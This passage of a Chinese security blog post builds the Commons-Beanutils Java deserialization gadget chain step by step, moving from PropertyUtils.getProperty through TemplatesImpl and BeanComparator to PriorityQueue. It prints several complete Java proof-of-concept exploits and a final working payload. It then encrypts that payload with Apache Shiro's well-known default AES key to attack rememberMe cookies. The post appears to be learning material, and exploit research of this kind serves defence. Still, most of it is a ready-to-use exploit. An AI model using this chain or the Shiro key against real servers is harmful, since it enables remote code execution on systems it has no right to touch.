+<p>我们传入的是name属性，通过调试信息可以看到这里获取到了属性描述符，也根据属性描述符获取到了name的get方法也就是getName()方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163323611.png"
+                      alt="image-20231031163323611"
+                ></p>
+<p>然后就是一个反射调用我们获取到的get方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163355725.png"
+                      alt="image-20231031163355725"
+                ></p>
+<p>我们跟进去可以看到这里就是通过反射调用getName()方法去获取到我们的属性值，然后返回。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163716087.png"
+                      alt="image-20231031163716087"
+                ></p>
+<p>可以看到这里就已经获取到属性值返回了。</p>
+<p>那么分析到这里我们对PropertyUtils类的这个getProperty方法是如何调用目标类的get方法去获取属性值的流程有了了解。</p>
+<p>那么我们通过这个getProperty方法就可以执行任意类的getter方法，那么我们如果可以找到一哥getter方法是存在危险利用的或者其能够执行任意代码，那我们就可以进行进一步的利用。</p>
+<h1 id="三、构造CB链"><a href="#三、构造CB链" class="headerlink" title="三、构造CB链"></a>三、构造CB链</h1><p>在我们前面分析CC3动态类加载恶意字节码的时候用到了TemplatesImpl类，我们是通过TemplatesImpl类newTransformer()方法去调用getTransletInstance()方法调用defineTransletClasses()方法进行类加载字节码进行命令执行。</p>
+<p>在CC3中我们是通过invokertransform类的transform方法去调用这个newTransform方法</p>
+<p>但是在TemplatesImpl类也存在一个getOutputProperties方法可以去调用newTransfomr方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Properties getOutputProperties() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (TransformerConfigurationException e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在getOutputProperties()里是调用了newTransformer()方法。</p>
+<p>而且我们这里观察这个getOutputProperties()是符合javabean的格式的一个方法。</p>
+<p>那么我们通过getProperty方法去调用getOutputProperties()方法也是可以调用成功，那么就可以调用newtransform进而调用动态类加载恶意字节码的后续利用链进行代码执行。那么到这里我们就找到了一个在CB下面的代码执行点。</p>
+<p>那我们这里就只需要通过getProperty方法去获取OutputProperties属性值就可以了。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>那我们这里就可以调用到newTranform，后续的就还是CC3中动态加载字节码那一套了。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Person person=new Person();</span><br><span class="line">        person.setName(&quot;hacker&quot;);</span><br><span class="line">        person.setAge(12);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行测试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031170542682.png"
+                      alt="image-20231031170542682"
+                ></p>
+<p>可以看到我们这里弹出计算器的命令执行成功了，说明我们后续的利用链成功调用了。</p>
+<p>那么我们要构造的是一个反序列化链，剩下就还是向上找哪里调用了getProperty方法，最终找到一个readObject方法。那这还是我们前面找CC链那一套。那我们这里就是向上找getProperty方法的调用：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172347359.png"
+                      alt="image-20231031172347359"
+                ></p>
+<p>可以看到在cb库中可以使用的方法不是很多</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172240781.png"
+                      alt="image-20231031172240781"
+                ></p>
+<p>我们这里使用的是commons.beanutils库中的BeanComparator类中的compare方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172523556.png"
+                      alt="image-20231031172523556"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object value1 = PropertyUtils.getProperty( o1, property );</span><br><span class="line">Object value2 = PropertyUtils.getProperty( o2, property );</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到这里调用了getProperty方法，这里应该也是要通过getProperty方法去获取属性值的，o1和o2都是compare传递进来都是可控的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172948974.png"
+                      alt="image-20231031172948974"
+                ></p>
+<p>这个property也是可控的。那么这个compare就是可以利用的。</p>
+<p>那么我下面就是要找compare的调用.</p>
+<p>关于compare方法的调用，我们其实可以想到我们在CC4和CC2中用到过compare方法</p>
+<p>在CC4中我们是通过compare方法去触发chainTransformer类的transform方法。进行去触发后续的利用链。</p>
+<p>在CC4和CC2中我们是通过priorityQueue这个类的 siftDownUsingComparator方法去触发的compare方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031173807933.png"
+                      alt="image-20231031173807933"
+                ></p>
+<p>在priorityQueue的siftDownUsingComparator方法中是通过comparator去触发的compare方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031173855396.png"
+                      alt="image-20231031173855396"
+                ></p>
+<p>而comparator是priorityQueue的构造方法传递的，是可控的，那么我们就可以通过这里去触发compare方法进而触发getProperty方法去触发后续利用链。</p>
+<p>那么到这里就和我们前面分析CC4串起来了。我们可以使用CC4的中的入口点去触发后续利用链。</p>
+<p>我们这里先回顾一些CC4中的入口点。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174301451.png"
+                      alt="image-20231031174301451"
+                ></p>
+<p>我们是通过priorityQueue类的readObject方法去调用heapify()方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174349812.png"
+                      alt="image-20231031174349812"
+                ></p>
+<p>然后去调用siftDown方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174404276.png"
+                      alt="image-20231031174404276"
+                ></p>
+<p>调用siftDownUsingComparator方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174423347.png"
+                      alt="image-20231031174423347"
+                ></p>
+<p>最终调用到compare方法。</p>
+<p>那么到这里我们CB利用链就很清晰了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031175118727.png"
+                      alt="image-20231031175118727"
+                ></p>
+<p>那我们这里就可以构造我们的代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,null);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(&quot;2222&quot;);</span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031185851157.png"
+                      alt="image-20231031185851157"
+                ></p>
+<p>这里抛出了一个异常。</p>
+<p>在第二个add处打一个断点</p>
+<p>跟进去调试一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190137166.png"
+                      alt="image-20231031190137166"
+                ></p>
+<p>正常调用add添加数据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190201981.png"
+                      alt="image-20231031190201981"
+                ></p>
+<p>然后调用到siftup方法然后调用siftUpUsingComparator(k, x);</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190320681.png"
+                      alt="image-20231031190320681"
+                ></p>
+<p>到这里就是调用compare跟进后续利用链</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190629805.png"
+                      alt="image-20231031190629805"
+                ></p>
+<p>后面就是调用getProperty()方法触发getoutputProperties方法，后面的通过getProperty()方法去触发到getoutputProperties方法的过程不在跟进分析了，直接跳进到抛出异常的地方</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190945188.png"
+                      alt="image-20231031190945188"
+                ></p>
+<p>这个地方就很熟悉了。我们在上面分析getProperty()方法获取属性值的流程中，最终是到了PropertyUtilsBean类的getSimpleProperty()方法里面。</p>
+<p>在这个方法里面通过<code>PropertyDescriptor descriptor =getPropertyDescriptor(bean, name);</code>去获取到属性标识符，然后通过属性标识符去获取到属性的get方法，最终通过反射调用获取属性值。</p>
+<p>但是在调试中我们可以看到这个descriptor的值是为null的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031191256878.png"
+                      alt="image-20231031191256878"
+                ></p>
+<p>这说明我们并没有获取到属性表示符，导致抛出了异常。</p>
+<p>我们这里可以跟进去到这个<code>getPropertyDescriptor</code>里面看一下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor[] descriptors = getPropertyDescriptors(bean);</span><br><span class="line">if (descriptors != null) &#123;</span><br><span class="line">    </span><br><span class="line">    for (int i = 0; i &lt; descriptors.length; i++) &#123;</span><br><span class="line">        if (name.equals(descriptors[i].getName())) &#123;</span><br><span class="line">            return (descriptors[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里获取属性表示符，就是通过 getPropertyDescriptors(bean);获取与给定 JavaBean 对象相关的属性描述符的数组。然后通过循环遍历与目标属性进行比对，如果匹配则会返回，不匹配继续循环。</p>
+<p>那么这里抛出的异常的原因就是目标属性名与获取到与javabean对象相关的属性描述符的数组没有一个匹配的。</p>
+<p>至于为什么匹配不成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031192848860.png"
+                      alt="image-20231031192848860"
+                ></p>
+<p>我们这里的javabean就是我们的传入的222，但是我们要找的属性名是outputProperties，他的get方法是在TemplatesImpl();里面的。那我们在222里面去找他的属性标识符那肯定是找不到的，因为222压根就不是一个类。</p>
+<p>当然了，这里解决也很好解决，直接把222改成TemplatesImpl();就行了</p>
+<p>那我们这里可以来尝试一些：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,null);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        //unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031193131789.png"
+                      alt="image-20231031193131789"
+                ></p>
+<p>可以看到确实弹出了计算器，但是我们这里并没有进行反序列化，但却弹出来了计算器</p>
+<p>这里和前面分析CC4的没有反序列化就弹出来了计算器的原因是一样的，我们这里add添加了templates</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201949994.png"
+                      alt="img"
+                ></p>
+<p>这里我们在CC4中已经说过了，添加两个数据就会导致这个循环条件成立，从而导致调用了后续利用链</p>
+<p>但是我们这里不改就会导致抛出异常，无法调用后续利用链</p>
+<p>我们这里可以想到我们在CC4中用的是TransformingComparator的compare方法去触发的后续利用链，那我们这里可以先让PriorityQueue类的comparator属性赋值为TransformingComparator，然后再反序列化前再改回来。</p>
+<p>当然这里会有一个疑问，我们这里打的不是无CC依赖吗，为什么还使用CC依赖里面的类。其实这里无所谓的，我们这里只是为了过了这个异常，当我们这里过了这个异常后吗，再修改回来就行，虽然目标服务器可能没有这个cc依赖，但是我们本地有，而且我们再反序列化前就把他改成正确的类了，不影响再服务器上面的正常执行。</p>
+<p>最终POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class Beantest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,null);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(&quot;2222&quot;);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; cl = PriorityQueue.class;</span><br><span class="line">        Field comparatorFiled = cl.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        comparatorFiled.setAccessible(true);</span><br><span class="line">        comparatorFiled.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行测试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031195224455.png"
+                      alt="image-20231031195224455"
+                ></p>
+<p>可以看到本地弹出计算器成功。</p>
+<h1 id="四、shiro打CB依赖"><a href="#四、shiro打CB依赖" class="headerlink" title="四、shiro打CB依赖"></a>四、shiro打CB依赖</h1><p>我们这里尝试去打shiro</p>
+<p>还是先aes加密编码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;sercb1.bin&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>替换</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031201238707.png"
+                      alt="image-20231031201238707"
+                ></p>
+<p>可以看到成功执行了。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> shiro无CC打CB依赖</li>
+        <li><strong>作者:</strong> GTL-JU</li>
+        <li><strong>创建于:</strong> 2023-10-31 20:14:40</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-31 20:17:03
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://gtl-ju.github.io/2023/10/31/shiro打.CommonsBeanutils依赖与/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/java/">#java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/10/29/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">jackson反序列化原理学习</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
